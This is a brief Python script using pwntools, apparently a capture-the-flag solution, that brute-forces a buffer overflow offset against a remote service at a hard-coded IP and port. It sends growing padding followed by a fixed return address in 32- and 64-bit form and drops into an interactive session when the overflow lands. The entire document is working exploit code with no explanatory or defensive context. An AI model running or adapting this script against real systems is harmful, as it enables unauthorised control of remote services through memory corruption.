from pwn import *

ret_addr = 0x40060d

def fuzz(p, i , j):
	payload = b"a" * i
	if j == 1:
		payload += p32(ret_addr)
	else:
		payload += p64(ret_addr)
	p.recvuntil(b">")
	p.sendline(payload)

for i in range(1000):
	print(i)
	for j in range(1, 3):
		try:
			p = remote("61.147.171.105",65005)
			fuzz(p, i, j)
			print(p.recv())
			p.interactive()
		except:
			p.close()